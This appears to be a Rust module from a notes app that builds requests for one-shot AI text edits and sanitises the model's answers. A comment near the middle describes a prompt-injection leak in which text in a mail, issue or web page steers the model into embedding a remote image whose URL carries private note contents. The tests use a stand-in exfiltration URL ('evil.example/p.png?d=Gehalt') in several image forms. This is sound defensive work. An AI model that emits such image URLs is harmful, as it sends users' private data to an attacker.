//! One-shot text transformations: the inline AI bar in the editor
//! („Kürzen“, „Übersetzen“, …) and the meeting summary of a page.
//!
//! The UI builds the instruction; this module wraps it and the text into a
//! request that asks for the result only, as Markdown, without retrieval.

use std::collections::HashMap;

use super::client::ChatMessage;
use crate::trf;

/// Longest text sent along (characters); longer pages are cut.
pub const MAX_TEXT_CHARS: usize = 60_000;

/// The system prompt of a transformation. `today` is shown to the model so
/// relative dates („nächsten Freitag“) can become `YYYY-MM-DD`.
pub fn system_prompt(today: &str) -> String {
    trf!(
        "Du bearbeitest Texte in Arcalo, einem Notizprogramm mit Markdown. Heute ist {today}. \
         Führe die Anweisung des Nutzers auf den Text zwischen <text> und </text> aus. Antworte \
         ausschließlich mit dem Ergebnis in Markdown: keine Einleitung, keine Erklärung, kein \
         umschließender Codeblock. Behalte Links ([[Seite]], [Text](URL)), #Tags, Aufgaben \
         (- [ ] …, due:JJJJ-MM-TT, !/!!) und /zeit-Zeilen unverändert bei, sofern die Anweisung \
         nichts anderes verlangt. Behalte die Sprache des Textes bei, außer beim Übersetzen.",
        "You edit texts in Arcalo, a notes app with Markdown. Today is {today}. Carry out the \
         user's instruction on the text between <text> and </text>. Answer with the result in \
         Markdown only: no introduction, no explanation, no code block around it. Keep links \
         ([[Page]], [Text](URL)), #tags, tasks (- [ ] …, due:YYYY-MM-DD, !/!!) and /zeit lines \
         unchanged unless the instruction asks otherwise. Keep the language of the text, except \
         when translating."
    )
}

/// Messages for one transformation of `text` according to `instruction`.
pub fn messages(instruction: &str, text: &str, page_title: Option<&str>, today: &str) -> Vec<ChatMessage> {
    let text: String = text.chars().take(MAX_TEXT_CHARS).collect();
    let mut user = String::new();
    if let Some(t) = page_title.filter(|t| !t.trim().is_empty()) {
        user.push_str(&trf!("Seite: „{}“\n\n", "Page: “{}”\n\n", t.trim()));
    }
    user.push_str(&trf!(
        "Anweisung: {}\n\n<text>\n{}\n</text>",
        "Instruction: {}\n\n<text>\n{}\n</text>",
        instruction.trim(),
        text.trim_end()
    ));
    vec![ChatMessage::system(system_prompt(today)), ChatMessage::user(user)]
}

/// Removes a code fence the model put around the whole answer (```markdown … ```) and turns
/// images from other servers into links ([`without_remote_images`]).
pub fn clean_output(answer: &str) -> String {
    without_remote_images(&unfence(answer))
}

fn unfence(answer: &str) -> String {
    let t = answer.trim();
    let Some(rest) = t.strip_prefix("```") else { return t.to_owned() };
    let Some((lang, body)) = rest.split_once('\n') else { return t.to_owned() };
    let lang = lang.trim().to_lowercase();
    if !(lang.is_empty() || lang == "markdown" || lang == "md") {
        return t.to_owned();
    }
    match body.trim_end().strip_suffix("```") {
        Some(inner) if !inner.contains("\n```") => inner.trim_end().to_owned(),
        _ => t.to_owned(),
    }
}

/// Whether the address of an image is fetched from another server (not inline data, not an
/// attachment of the app, not a relative path).
fn remote(url: &str) -> bool {
    let u = url.trim().trim_start_matches('<').trim().to_ascii_lowercase();
    let local = ["data:", "blob:", "arcalo-asset:", "http://arcalo-asset.localhost/"];
    if local.iter().any(|l| u.starts_with(l)) {
        return false;
    }
    if u.starts_with("//") {
        return true;
    }
    let scheme = u.split(':').next().unwrap_or_default();
    u.contains(':')
        && scheme.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
        && scheme.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'))
}

/// A model's answer before it goes into a page: an image from another server becomes a link to
/// it (`![a](https://…)` → `[a](https://…)`, raw `<img src="https://…">` too), outside code.
/// Shown in a page, the image would be fetched at once, and its address can carry what the
/// model read (a private note, steered by text in a mail, a Jira issue or a web page).
pub fn without_remote_images(md: &str) -> String {
    let lower = md.to_ascii_lowercase();
    if !md.contains("![") && !lower.contains("<im") {
        return md.to_owned();
    }
    let refs = definitions(md);
    let mut fence: Option<String> = None;
    let mut out = Vec::new();
    for line in md.split('\n') {
        let indent = line.len() - line.trim_start_matches(' ').len();
        let mark: String = line.trim_start_matches(' ').chars().take_while(|c| *c == '`' || *c == '~').collect();
        let is_fence = indent <= 3 && mark.len() >= 3 && mark.chars().all(|c| c == mark.chars().next().unwrap_or('`'));
        if is_fence {
            match &fence {
                None => fence = Some(mark),
                Some(f) if f.starts_with(&mark[..1]) && mark.len() >= f.len() => fence = None,
                Some(_) => {}
            }
            out.push(line.to_owned());
            continue;
        }
        if fence.is_some() {
            out.push(line.to_owned());
            continue;
        }
        // Text between backticks is code.
        let parts: Vec<String> = line
            .split('`')
            .enumerate()
            .map(|(i, p)| if i % 2 == 1 { p.to_owned() } else { unimage(p, &refs) })
            .collect();
        out.push(parts.join("`"));
    }
    out.join("\n")
}

fn unimage(text: &str, refs: &HashMap<String, String>) -> String {
    let text = markdown_images(text, refs);
    raw_images(&text)
}

/// The reference definitions `[label]: url` of `md` (labels lower-cased).
fn definitions(md: &str) -> HashMap<String, String> {
    md.lines()
        .filter_map(|l| {
            let t = l.trim_start();
            if l.len() - t.len() > 3 {
                return None;
            }
            let (label, after) = t.strip_prefix('[')?.split_once("]:")?;
            let url = after.split_whitespace().next()?;
            Some((label.trim().to_lowercase(), url.trim_matches(['<', '>']).to_owned()))
        })
        .collect()
}

/// The index in `s` of the bracket that closes one opened before `s` (nested pairs and escapes
/// skipped; not across lines).
fn closing(s: &str, open: char, close: char) -> Option<usize> {
    let (mut depth, mut escaped) = (1, false);
    for (i, c) in s.char_indices() {
        if escaped {
            escaped = false;
            continue;
        }
        match c {
            '\\' => escaped = true,
            '\n' => return None,
            c if c == open => depth += 1,
            c if c == close => {
                depth -= 1;
                if depth == 0 {
                    return Some(i);
                }
            }
            _ => {}
        }
    }
    None
}

/// An image with a remote address loses its `!` and becomes a link: `![alt](url …)`,
/// `![alt][ref]`, `![alt][]` and `![alt]` (with a definition of `ref`/`alt` in the text). An
/// inline one without alt text gets the address as its text.
fn markdown_images(text: &str, refs: &HashMap<String, String>) -> String {
    let lookup = |label: &str| refs.get(&label.trim().to_lowercase()).cloned();
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(at) = rest.find("![") {
        out.push_str(&rest[..at]);
        let tail = &rest[at + 2..];
        let Some(close) = closing(tail, '[', ']') else {
            out.push_str("![");
            rest = tail;
            continue;
        };
        let alt = &tail[..close];
        let after = &tail[close + 1..];
        let (url, len) = if let Some(inner) = after.strip_prefix('(') {
            match closing(inner, '(', ')') {
                Some(end) => {
                    (inner[..end].split_whitespace().next().map(|u| u.trim_matches(['<', '>']).to_owned()), end + 2)
                }
                None => (None, 0),
            }
        } else if let Some(r) = after.strip_prefix('[') {
            match r.find(']') {
                Some(end) => (lookup(if r[..end].trim().is_empty() { alt } else { &r[..end] }), end + 2),
                None => (lookup(alt), 0),
            }
        } else {
            (lookup(alt), 0)
        };
        let whole = &rest[at..at + 2 + close + 1 + len];
        match url.filter(|u| remote(u)) {
            Some(u) if len > 0 && after.starts_with('(') && alt.trim().is_empty() => {
                out.push_str(&format!("[{u}]{}", &after[..len]));
            }
            Some(_) => out.push_str(&whole[1..]),
            None => out.push_str(whole),
        }
        rest = &rest[at + whole.len()..];
    }
    out.push_str(rest);
    out
}

/// The value of attribute `name` in the tag `tag` (lower-cased names, quoted or bare values).
fn attr<'a>(tag: &'a str, name: &str) -> Option<&'a str> {
    let lower = tag.to_ascii_lowercase();
    let mut from = 0;
    while let Some(i) = lower[from..].find(name) {
        let at = from + i;
        from = at + name.len();
        if !lower[..at].ends_with(|c: char| c.is_whitespace()) {
            continue;
        }
        let rest = tag[from..].trim_start();
        let Some(rest) = rest.strip_prefix('=') else { continue };
        let rest = rest.trim_start();
        return Some(match rest.chars().next() {
            Some(q @ ('"' | '\'')) => rest[1..].split(q).next().unwrap_or_default(),
            _ => rest.split(|c: char| c.is_whitespace() || c == '>').next().unwrap_or_default(),
        });
    }
    None
}

/// Raw `<img … src="remote">` (also `<image …>`, which HTML reads as `<img>`) → `[alt](<remote>)`.
fn raw_images(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    loop {
        let lower = rest.to_ascii_lowercase();
        let tag_at = |name: &str| {
            lower.match_indices(name).map(|(i, _)| i).find(|&i| {
                lower[i + name.len()..].chars().next().is_none_or(|c| c.is_whitespace() || c == '/' || c == '>')
            })
        };
        let Some(at) = [tag_at("<img"), tag_at("<image")].into_iter().flatten().min() else { break };
        let Some(end) = rest[at..].find('>').map(|e| at + e + 1) else { break };
        let tag = &rest[at..end];
        out.push_str(&rest[..at]);
        match attr(tag, "src").filter(|u| remote(u)) {
            Some(url) => {
                let label = attr(tag, "alt").map(str::trim).filter(|a| !a.is_empty()).unwrap_or(url);
                let label: String = label.chars().filter(|c| !matches!(c, '[' | ']')).collect();
                let url: String = url.chars().filter(|c| !matches!(c, '<' | '>') && !c.is_whitespace()).collect();
                out.push_str(&format!("[{label}](<{url}>)"));
            }
            None => out.push_str(tag),
        }
        rest = &rest[end..];
    }
    out.push_str(rest);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wraps_instruction_and_text() {
        let m = messages("Kürze den Text.", "Ein langer Satz.\n", Some("Jour fixe"), "Donnerstag, 24.09.2026");
        assert_eq!(m.len(), 2);
        assert_eq!(m[0].role, "system");
        assert!(m[0].content.as_deref().unwrap().contains("24.09.2026"));
        let user = m[1].content.as_deref().unwrap();
        assert!(user.starts_with("Seite: „Jour fixe“"));
        assert!(user.contains("Anweisung: Kürze den Text."));
        assert!(user.ends_with("<text>\nEin langer Satz.\n</text>"));
    }

    /// q124 R3C-1: an answer written into a page (meeting prep, status report, review, inline AI)
    /// must not embed an image from another server: its address can carry what the model read.
    #[test]
    fn remote_images_of_an_answer_become_links() {
        let leak = "https://evil.example/p.png?d=Gehalt";
        assert_eq!(clean_output(&format!("A ![Logo]({leak}) B")), format!("A [Logo]({leak}) B"));
        assert_eq!(clean_output(&format!("![]({leak} \"t\")")), format!("[{leak}]({leak} \"t\")"));
        assert_eq!(clean_output(&format!("```markdown\n# T\n\n![x]({leak})\n```")), format!("# T\n\n[x]({leak})"));
        assert_eq!(clean_output(&format!("<IMG alt='Logo' SRC=\"{leak}\">")), format!("[Logo](<{leak}>)"));
        assert_eq!(clean_output("![x](//evil.example/a.png)"), "[x](//evil.example/a.png)");
        // Nested brackets, references, <image> (HTML reads it as <img>).
        assert_eq!(clean_output(&format!("![[a]]({leak})")), format!("[[a]]({leak})"));
        assert_eq!(
            clean_output(&format!("Text ![x][1] und ![y]\n\n[1]: {leak}\n[Y]: <{leak}>")),
            format!("Text [x][1] und [y]\n\n[1]: {leak}\n[Y]: <{leak}>")
        );
        assert_eq!(clean_output(&format!("<image src={leak}>")), format!("[{leak}](<{leak}>)"));
        // Code, attachments, inline data and relative paths stay.
        let kept = "```md\n![x](https://example.com/a.png)\n```\n\n`![y](https://example.com/b.png)` and `<img src=\"https://e.x/c\">`\n\n![[foto.png]] ![z](data:image/png;base64,AA==) ![w](bild.png) <img src=\"bild.png\">";
        assert_eq!(without_remote_images(kept), kept);
        // Broken syntax is left as it is.
        for odd in ["![nicht zu", "![a](https://x", "![a] (https://x)", "<img src=", "![[foto.png]](bild.png)"] {
            assert_eq!(without_remote_images(odd), odd);
        }
    }

    #[test]
    fn long_texts_are_cut() {
        let long = "ä".repeat(MAX_TEXT_CHARS + 100);
        let m = messages("x", &long, None, "heute");
        let user = m[1].content.as_deref().unwrap();
        assert_eq!(user.matches('ä').count(), MAX_TEXT_CHARS);
        assert!(!user.contains("Seite:"));
    }

    #[test]
    fn strips_an_outer_fence_only() {
        assert_eq!(clean_output("```markdown\n## A\n\n- b\n```"), "## A\n\n- b");
        assert_eq!(clean_output("```\nText\n```\n"), "Text");
        assert_eq!(clean_output("  Kurz.  "), "Kurz.");
        // Real code stays a code block.
        assert_eq!(clean_output("```rust\nfn main() {}\n```"), "```rust\nfn main() {}\n```");
        // Two blocks: not one wrapper.
        let two = "```\na\n```\nText\n```\nb\n```";
        assert_eq!(clean_output(two), two);
    }
}
